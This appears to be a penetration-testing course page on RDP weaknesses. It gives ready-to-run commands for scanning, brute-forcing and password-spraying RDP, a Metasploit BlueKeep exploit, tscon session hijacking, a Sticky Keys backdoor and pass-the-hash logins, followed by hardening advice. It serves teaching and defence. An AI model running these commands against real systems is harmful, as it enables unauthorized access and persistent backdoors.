# RDP Vulnerabilities

## Unit 6 - Topic 6 | Network Protocol Attacks

---

## Overview

**RDP (Remote Desktop Protocol)** on port 3389 provides remote GUI access to Windows systems. Its widespread use and direct access to the desktop make it a high-value target. Historical vulnerabilities like BlueKeep and common misconfigurations create significant attack surface.

---

## 1. RDP Attack Surface

```
RDP SECURITY CONCERNS:

PROTOCOL VULNERABILITIES:
├── BlueKeep (CVE-2019-0708) — Pre-auth RCE
├── DejaBlue (CVE-2019-1181/1182)
├── MITM (no NLA = credential interception)
├── Encryption downgrade attacks
└── CredSSP vulnerabilities

CONFIGURATION ISSUES:
├── Internet-exposed RDP (port 3389)
├── Weak/default credentials
├── No Network Level Authentication (NLA)
├── No account lockout policy
├── No MFA on RDP
└── Admin accounts allowed RDP access

CREDENTIAL ATTACKS:
├── Brute force / dictionary attacks
├── Password spraying
├── Credential stuffing
├── Pass-the-hash (Restricted Admin mode)
└── Stolen RDP session files (.rdp)
```

---

## 2. RDP Enumeration

```bash
# === CHECK IF RDP IS OPEN ===
nmap -p 3389 --script rdp-enum-encryption target.com
nmap -p 3389 --script rdp-ntlm-info target.com
# Reveals: OS version, domain name, hostname

# === RDP SECURITY CHECK ===
nmap -p 3389 --script rdp-vuln-ms12-020 target.com  # DoS vuln
nmap -p 3389 --script rdp-enum-encryption target.com # Encryption level

# === BLUEKEEP CHECK ===
# Metasploit:
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
set RHOSTS target.com
run

# rdpscan:
rdpscan target.com
# Reports: SAFE, VULNERABLE, or UNKNOWN

# === FIND RDP ON NETWORK ===
nmap -p 3389 --open 192.168.1.0/24
# Find all hosts with RDP exposed

# CrackMapExec:
crackmapexec rdp 192.168.1.0/24
# Enumerate RDP across subnet
```

---

## 3. RDP Brute Force

```bash
# === HYDRA ===
hydra -l administrator -P passwords.txt rdp://target.com -t 4
# -t 4: Limit threads (RDP is slow)

# === CROWBAR (Designed for RDP) ===
crowbar -b rdp -s target.com/32 -u admin -C passwords.txt
# Better RDP brute force than Hydra

# === NCRACK ===
ncrack -p 3389 --user administrator -P passwords.txt target.com

# === CRACKMAPEXEC ===
crackmapexec rdp target.com -u users.txt -p "Summer2024!"
# Password spraying against RDP

# === FREERDP (Manual Connection) ===
xfreerdp /u:admin /p:password /v:target.com
xfreerdp /u:admin /p:password /v:target.com /cert:ignore

# === RDESKTOP ===
rdesktop -u admin -p password target.com
```

---

## 4. RDP Exploitation

```bash
# === BLUEKEEP (CVE-2019-0708) ===
# Pre-authentication RCE — wormable!
# Affects: Windows XP, 7, Server 2003, 2008, 2008 R2

# Metasploit:
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS target.com
set TARGET 1   # Target OS specific
exploit

# === RDP SESSION HIJACKING ===
# On compromised Windows with SYSTEM privileges:
# List active sessions:
query user
# Switch to another user's session WITHOUT password:
tscon 2 /dest:console
# Hijacks session ID 2

# === STICKY KEYS BACKDOOR ===
# Replace sethc.exe (Sticky Keys) with cmd.exe:
# Requires admin access first:
copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
# Now: At RDP login screen, press Shift 5 times
# → cmd.exe runs as SYSTEM!

# === PASS-THE-HASH (Restricted Admin) ===
# If Restricted Admin mode is enabled:
xfreerdp /u:admin /pth:NTLM_HASH /v:target.com
# Login with NTLM hash without knowing password
```

---

## 5. RDP Hardening

| Defense | Implementation |
|---------|---------------|
| **Enable NLA** | Require Network Level Authentication |
| **Block from internet** | Firewall rules, use VPN |
| **MFA** | Duo, Azure MFA for RDP |
| **Account lockout** | Lock after failed attempts |
| **Strong passwords** | Complex passwords, no reuse |
| **Patch regularly** | Fix BlueKeep, DejaBlue, etc. |
| **RDP Gateway** | Proxy RDP through HTTPS gateway |
| **Limit RDP users** | Only specific accounts, not Domain Admins |
| **Session timeouts** | Disconnect idle sessions |
| **Audit logging** | Monitor RDP logon events (4624/4625) |

---

## Summary Table

| Concept | Key Point |
|---------|-----------|
| **RDP** | Port 3389 — Windows remote desktop |
| **BlueKeep** | CVE-2019-0708 — pre-auth RCE (wormable) |
| **NLA** | Network Level Auth — pre-authentication |
| **Session hijack** | tscon — switch to another user's session |
| **Sticky Keys** | Replace sethc.exe for persistent backdoor |
| **Defense** | NLA + VPN + MFA + patching |

---

## Quick Revision Questions

1. **What is BlueKeep and which Windows versions are affected?**
2. **How does NLA improve RDP security?**
3. **What is the Sticky Keys backdoor technique?**
4. **How can RDP sessions be hijacked with SYSTEM access?**
5. **Why should RDP never be exposed directly to the internet?**

---

[← Previous: FTP/TFTP Attacks](05-ftp-tftp-attacks.md)

---

*Unit 6 - Topic 6 of 6 | [Back to README](../README.md) | [Next Unit: Wireless Network Testing →](../07-Wireless-Network-Testing/01-wireless-reconnaissance.md)*
